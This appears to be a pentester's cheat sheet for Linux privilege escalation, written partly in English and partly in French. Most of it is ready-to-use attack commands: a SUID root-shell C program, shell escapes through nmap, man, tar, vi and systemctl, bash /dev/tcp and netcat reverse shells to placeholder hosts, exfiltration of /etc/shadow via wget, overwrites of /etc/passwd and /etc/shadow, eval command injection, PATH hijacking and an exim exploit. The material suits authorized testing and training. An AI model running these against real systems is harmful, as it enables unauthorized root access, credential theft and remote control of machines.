# Privilege Escalation

{% embed url="https://gtfobins.github.io" %}

* Binary with SUID bit setting UID and GROUP to 0

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(int argc, char *argv[])
{
	setuid(0);
	setgid(0);
	system("/bin/bash");
}
```

* `chmod u+s`**` <FILE>`**

#### **Bypass container**

IP address is in the `172.20.0.0` range which suggest that we are in a container Check if you are `root` Check if in docker container : `grep -i docker /proc/self/cgroup; find / -name "*dockerenv*" -exec ls -la {} \;`

**Bypass limited shell**

* /!\ au shell limités : ils bloquent tout ce qui est ailleurs que dans le dossier courant. Il bloque toutes les commandes car il bloque /, /bin ...
  * rbash : WiP
  * lshell : [https://www.aldeid.com/wiki/Lshell](https://www.aldeid.com/wiki/Lshell)
    * Check allowed command : `?` - `help`
      * If `echo` allowed, escape doing : `echo os.system('/bin/bash')`
      * If `vi` or `vim` allowed, escape doing :
        * `:set shell=/bin/sh`
        * `:shell`

**Linux kernel exploit**

* **Memodipper**
  * Exploit: [https://github.com/lucyoa/kernel-exploits/tree/master/memodipper](https://github.com/lucyoa/kernel-exploits/tree/master/memodipper)
  * Download it on the target and run it `./memodipper`
    * Be sure to use a **PTY** otherwise the exploit could not work

***

**Ability to be root**

* `sudo -i`
* `sudo -s`
* `sudo su`

**Right to modify /etc/passwd**

* `echo root::0:0:root:/root:/bin/bash > /etc/passwd`
  * Removing x means root requires no password anymore
    * Then do `su`

**Nmap in sudo -l**

```
(root) NOPASSWD: /usr/bin/nmap
```

* Lancer nmap en mode interactif : `sudo nmap --interactive`
* Lancer un shell : `nmap> !sh`
* Executer des commandes : `sh-3.2# id`

**Man in sudo -l**

* `sudo man man`
* `!/bin/sh`

**Text editor in sudo -l**

```
(root) NOPASSWD: /usr/local/bin/ht
```

* Lancer ht : `sudo ht`
* Editer le fichier `/etc/sudoers`
* Ajouter `/bin/sh` à la fin de l'entrée de l'utilisateur courant - Sauvegarder
* Lancer un shell root : `sudo /bin/sh`

**Wget in sudo -l**

* Display a file : `sudo wget -i /etc/shadow`
* Exfiltrate a file :
  * On the target : sudo wget --post-file=/etc/shadow
    * Requirements : sudo access or `wget` in sudoers
  * On Kali : nc -nlvp 80
* Overwrite a file : `sudo wget <IP>:<PORT>/shadow -O /etc/shadow`

**Tar in sudo -l**

* `sudo -u <USER> tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash`
* Create a reverse shell file : `echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/<IP>/<PORT> 0>&1' > <SHELL-FILE>.sh`
* Tar the reverse shell file : `tar -cvf <ARCHIVE-FILE>.tar <SHELL-FILE>.sh`
* Extract the reverse shell and execute it : `sudo -u <USER> tar -xvf <ARCHIVE-FILE>.tar --to-command /bin/bash`
  * `--to-command` : Pipe extracted files to COMMAND

**Sudoedit with two wildcar**

```
(root) NOPASSWD: sudoedit /<PATH>/*/*<FILE>
```

* Exploit : [https://www.exploit-db.com/exploits/37710](https://www.exploit-db.com/exploits/37710)

**Weird homemade SUID file**

* Download it locally
* Run it `ltrace <SUID-FILE>` to see what it does

**Systemctl avec le bit SUID**

* Execution de commande avec systemctl (redirection du résultat dans un fichier )

```
$ TF=$(mktemp).service
$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "<command> > /tmp/output"
> [Install]
> WantedBy=multi-user.target' > $TF
$ systemctl link $TF
$ systemctl enable --now $TF
$ cat /tmp/output
```

* Reverse shell avec systemctl (en utilisant netcat)

```
TF=$(mktemp).service
$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "nc -e /bin/sh <IP> <PORT>"
> [Install]
> WantedBy=multi-user.target' > $TF
$ systemctl link $TF
$ systemctl enable --now $TF
```

* Executer un .sh avec systemctl
* Créer un fichier

```
#!/bin/bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 
```

* Configurer systemctl pour l'exécuter

```
[Unit]
Description=root shell
[Service]
ExecStart=/tmp/shelly.sh
[Install]
WantedBy=multi-user.target
```

**keybase-redirector avec le bit SUID**

```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(int argc, char **argv)
{
  setreuid(0,0);
  system("nc -e /bin/bash <IP> <PORT>");
  return(0);
}
```

**exim-4.84-3**

* `/tmp/root.pm`

```
package root;
use strict;
use warnings;
system("/bin/sh");
```

* `PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps`

**Injection de commandes dans un script (python/bash)**

* `OR $(whoami)`
* `$(/bin/bash)`
* `eval('%s > 1 ' % <USER_INPUT>)`
  * `__import__('os').popen('ping -c 6 <IP>').read()`
    * Can also use `system`
  * `__import__('os').system('nc <IP> <PORT> | /bin/sh')"`
    * Then send a reverse shell on `<IP>:<PORT>`

**Replacing Built-ins command due to an environmental vulnerability**

* Contenus vulnérable : `/usr/bin/env echo <TEXT>`
* Modifier la variable d'environnement PATH : `PATH=/tmp:$PATH`
* Prendre en compte la modification : `export PATH`
* Créer un nouveau binaire : `echo /bin/sh > /tmp/echo`
* Ajouter les droits d'exécution au nouveau binaire : `chmod +x /tmp/echo`
* A l'exécution du script vulnérable, c'est notre version `/tmp/echo` qui s'exécutera

**Generate a new password for root**

* Sans sel : `openssl passwd -1` taper entrée et rentrer le password
  * Avec sel : `openssl passwd -1 <SALT>` taper entrée et rentrer le password

**Shellshock**

* Disclosed on September 2014

**Capabilities**

```
openssl=ep
```

* Dsiaply a file : `openssl enc -in /etc/shadow`
  * Use the openssl which have the capabilities
* Overwrite a file : `cat <FILE> | openssl enc -out /etc/shadow`

```
tcpdump=cap_net_admin
```

* You can user tcpdump to listen on NIC
